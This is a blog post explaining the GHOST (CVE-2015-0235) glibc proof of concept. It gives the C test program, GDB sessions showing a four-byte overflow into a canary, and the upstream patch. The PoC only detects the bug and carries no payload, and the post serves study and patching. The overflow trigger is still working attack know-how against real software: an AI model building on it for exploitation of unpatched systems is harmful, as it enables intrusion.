---
layout: post
title: CVE-2015-0235 GHOST PoC Explained
category: [Exploitation]
tags: [Exploitation, PoC]
comments: true
---

In this post we will go over the GHOST PoC under a debugger. This will visually show how the buffer overflow condition is met.

{% highlight C  %}
#include <netdb.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>

#define CANARY "in_the_coal_mine"

struct {
	char buffer[1024];
	char canary[sizeof(CANARY)];
} temp = { "buffer", CANARY };

int main(void) {
	struct hostent resbuf;
        struct hostent *result;
	int herrno;
	int retval;

	/*** strlen (name) = size_needed - sizeof (*host_addr) - sizeof (*h_addr_ptrs) - 1; ***/
	size_t len = sizeof(temp.buffer) - 16*sizeof(unsigned char) - 2*sizeof(char *) - 1;
	char name[sizeof(temp.buffer)];
	memset(name, '0', len);
	name[len] = '\0';

	retval = gethostbyname_r(name, &resbuf, temp.buffer, sizeof(temp.buffer), &result, &herrno);

	if (strcmp(temp.canary, CANARY) != 0) {
		puts("vulnerable");
		exit(EXIT_SUCCESS);
	}
	if (retval == ERANGE) {
		puts("not vulnerable");
		exit(EXIT_SUCCESS);
	}
	puts("should not happen");
	exit(EXIT_FAILURE);
}
{% endhighlight %}
Let me explain some of the above code.
First we define a CANARY, "in_the_coal_mine". This is our overwrite target.
Next we define a struct, which consists of two chunks. These chunks represent a buffer that will be overflowed by the glibc gethostbyname_r function, and the data that comes after it (the CANARY).
The first chunk is named "buffer" and its size is 1024 bytes, which is the size that will be passed to gethostbyname_r via the "buflen" argument.
Following the "buffer" chunk is the CANARY chunk. By overflowing the "buffer" chunk into the CANARY chunk, we can confirm the PoC exploit works.
Now that we have defined our struct representing the buffer for gethostname_r, the name char array is being initialized with 999 bytes of ASCII ‘0’ / HEX 0x30.

>**name**  
>*The name of the Internet host whose entry you want to find.*  
>**result**  
>*A pointer to a struct hostent where the function can store the host entry.*  
>**buffer**  
>*A pointer to a buffer that the function can use during the operation to store host database entries; buffer should be large enough to hold all of the data associated with the host entry. A 2K buffer is usually more than enough; a 256-byte buffer is safe in most cases.*  
>**buflen**  
>*The length of the area pointed to by buffer.*  
>**h_errnop**  
>*A pointer to a location where the function can store an herrno value if an error occurs.*  

Now, let's see the binary under GDB debugger.

{% highlight bash  %}
$ gdb -q ./GHOST 
Reading symbols from /home/student/GHOST...done.
(gdb) break main
Breakpoint 1 at 0x80484a2: file ghost.c, line 14.
(gdb) set disassembly-flavor intel
(gdb) run
Starting program: /home/student/GHOST 

Breakpoint 1, main () at ghost.c:14
14int main(void) {
(gdb) disas
Dump of assembler code for function main:
   0x08048494 <+0>:push   ebp
   0x08048495 <+1>:mov    ebp,esp
   0x08048497 <+3>:push   edi
   0x08048498 <+4>:push   esi
   0x08048499 <+5>:and    esp,0xfffffff0
   0x0804849c <+8>:sub    esp,0x450
=> 0x080484a2 <+14>:mov    eax,gs:0x14
   0x080484a8 <+20>:mov    DWORD PTR [esp+0x44c],eax
   0x080484af <+27>:xor    eax,eax
   0x080484b1 <+29>:mov    DWORD PTR [esp+0x44],0x3e7
   0x080484b9 <+37>:mov    eax,DWORD PTR [esp+0x44]
   0x080484bd <+41>:mov    DWORD PTR [esp+0x8],eax
   0x080484c1 <+45>:mov    DWORD PTR [esp+0x4],0x30
   0x080484c9 <+53>:lea    eax,[esp+0x4c]
   0x080484cd <+57>:mov    DWORD PTR [esp],eax
   0x080484d0 <+60>:call   0x80483c0 <memset@plt>
   0x080484d5 <+65>:lea    eax,[esp+0x4c]
   0x080484d9 <+69>:add    eax,DWORD PTR [esp+0x44]
   0x080484dd <+73>:mov    BYTE PTR [eax],0x0
   0x080484e0 <+76>:lea    eax,[esp+0x4c]
   0x080484e4 <+80>:lea    edx,[esp+0x40]
   0x080484e8 <+84>:mov    DWORD PTR [esp+0x14],edx
   0x080484ec <+88>:lea    edx,[esp+0x3c]
   0x080484f0 <+92>:mov    DWORD PTR [esp+0x10],edx
   0x080484f4 <+96>:mov    DWORD PTR [esp+0xc],0x400
   0x080484fc <+104>:mov    DWORD PTR [esp+0x8],0x804a040
   0x08048504 <+112>:lea    edx,[esp+0x28]
   0x08048508 <+116>:mov    DWORD PTR [esp+0x4],edx
   0x0804850c <+120>:mov    DWORD PTR [esp],eax
   0x0804850f <+123>:call   0x80483d0 <gethostbyname_r@plt>
   0x08048514 <+128>:mov    DWORD PTR [esp+0x48],eax
   0x08048518 <+132>:mov    edx,0x804a440
   0x0804851d <+137>:mov    eax,0x8048660
   0x08048522 <+142>:mov    ecx,0x11
   0x08048527 <+147>:mov    esi,edx
   0x08048529 <+149>:mov    edi,eax
   0x0804852b <+151>:repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
---Type <return> to continue, or q <return> to quit---q
Quit
(gdb)
{% endhighlight %}
Lines 24-28, are where memset initializes name char array with 999 bytes of '0'. Line 31, name char array is being null terminated. Lines 36-41, is where the arguments for gethostbyname_r are being pushed to the stack, right to left. After the gethostbyname_r function, on lines 44-49 is where strcmp confirms if the CANARY has been modified or not.  
Let's set a breakpoint before the gethostbyname function and inspect the temp stuct.
{% highlight bash  %}
(gdb) break *main+123
Breakpoint 3 at 0x804850f: file ghost.c, line 25.
(gdb) c
Continuing.

Breakpoint 3, 0x0804850f in main () at ghost.c:25
25	  retval = gethostbyname_r(name, &resbuf, temp.buffer, sizeof(temp.buffer), &result, &herrno);
(gdb) disas
...
   0x080484f0 <+92>:	mov    DWORD PTR [esp+0x10],edx
   0x080484f4 <+96>:	mov    DWORD PTR [esp+0xc],0x400
   0x080484fc <+104>:	mov    DWORD PTR [esp+0x8],0x804a040
   0x08048504 <+112>:	lea    edx,[esp+0x28]
   0x08048508 <+116>:	mov    DWORD PTR [esp+0x4],edx
   0x0804850c <+120>:	mov    DWORD PTR [esp],eax
=> 0x0804850f <+123>:	call   0x80483d0 <gethostbyname_r@plt>
...
(gdb) print temp
$4 = {buffer = "buffer", '\000' <repeats 1017 times>, canary = "in_the_coal_mine"}
(gdb) 

(gdb) x/1024s 0x804a040
0x804a040 <temp>:	 "buffer"
0x804a047 <temp+7>:	 ""
0x804a048 <temp+8>:	 ""
...
...
...
0x804a43d <temp+1021>:	 ""
0x804a43e <temp+1022>:	 ""
0x804a43f <temp+1023>:	 ""
0x804a440 <temp+1024>:	 "in_the_coal_mine"
{% endhighlight %}

As you can see, the content of temp is of two buffers named "buffer" and "canary". Content of Buffer is the name of the buffer "buffer" which is 6 bytes + 1017 bytes of '0' characters + null terminating byte = 1024 bytes. CANARY starts at memory location 0x804a440 or 1024 bytes within the temp struct, and it's content is as initialized "in_the_coal_mine".  
Now let's move 1 instruction down, past the gethostbyname_r function and inspect the temp struct again.
{% highlight bash  %}
(gdb) nexti
0x08048514	25	  retval = gethostbyname_r(name, &resbuf, temp.buffer, sizeof(temp.buffer), &result, &herrno);
(gdb) disas
Dump of assembler code for function main:
...
   0x080484f0 <+92>:	mov    DWORD PTR [esp+0x10],edx
   0x080484f4 <+96>:	mov    DWORD PTR [esp+0xc],0x400
   0x080484fc <+104>:	mov    DWORD PTR [esp+0x8],0x804a040
   0x08048504 <+112>:	lea    edx,[esp+0x28]
   0x08048508 <+116>:	mov    DWORD PTR [esp+0x4],edx
   0x0804850c <+120>:	mov    DWORD PTR [esp],eax
   0x0804850f <+123>:	call   0x80483d0 <gethostbyname_r@plt>
=> 0x08048514 <+128>:	mov    DWORD PTR [esp+0x48],eax
...
(gdb) print temp
$5 = {buffer = '\000' <repeats 16 times>, "@\240\004\b\000\000\000\000\000\000\000\000", '0' <repeats 996 times>, canary = "000\000he_coal_mine"}
(gdb) 
(gdb) x/1024s 0x804a040
0x804a040 <temp>:	 ""
0x804a041 <temp+1>:	 ""
...
...
0x804a05c <temp+28>:	 '0' <repeats 200 times>...
0x804a124 <temp+228>:	 '0' <repeats 200 times>...
0x804a1ec <temp+428>:	 '0' <repeats 200 times>...
0x804a2b4 <temp+628>:	 '0' <repeats 200 times>...
0x804a37c <temp+828>:	 '0' <repeats 199 times>
0x804a444 <temp+1028>:	 "he_coal_mine"
{% endhighlight %}
What this shows us is that now, the temp.buffer is 1028 bytes. 4 bytes from temp.buffer chunk has overflowed into the temp.canary chunk. If we inspect the 0x804a440 address, which use to be the start of the CANARY chunk, we should see the overflowed bytes followed by terminating null char.

{% highlight bash  %}
(gdb) x/s 0x804a440
0x804a440 <temp+1024>:	 "000"
(gdb) 
{% endhighlight %}

## The patch
As noted by Qualys in their report, the vulnerable code in the function is in nss/digits_dots.c. The patch mainly consists of adding 4 bytes to the size_needed object.

{% highlight bash  %}
vi nss/digits_dots.c

From this:
  105:  size_needed = (sizeof (*host_addr)
		+ sizeof (*h_addr_ptrs) + strlen (name) + 1);

  277:  size_needed = (sizeof (*host_addr)
		+ sizeof (*h_addr_ptrs) + strlen (name) + 1);

To this:
  105:  size_needed = (sizeof (*host_addr)
		+ sizeof (*h_addr_ptrs) + strlen (name)
		+ sizeof (*h_alias_ptr) + 1);

  277:  size_needed = (sizeof (*host_addr)
		+ sizeof (*h_addr_ptrs) + strlen (name)
		+ sizeof (*h_alias_ptr) + 1);
{% endhighlight %}

This adds the 4 missed bytes that cause the overflow from the first chunk to the next chunk. Now if we add this to the calculation of the "size_t len" from the above PoC code, instead of 999 bytes the name char array buffer will be 995 and the overflow will not work.

### Reference
* [Qualys report](https://www.qualys.com/research/security-advisories/GHOST-CVE-2015-0235.txt?_ga=1.220525848.141431497.1428700623)
* [Stackoverflow](http://stackoverflow.com/questions/28258135/manually-patching-for-ghost-vulnerability-on-legacy-server)

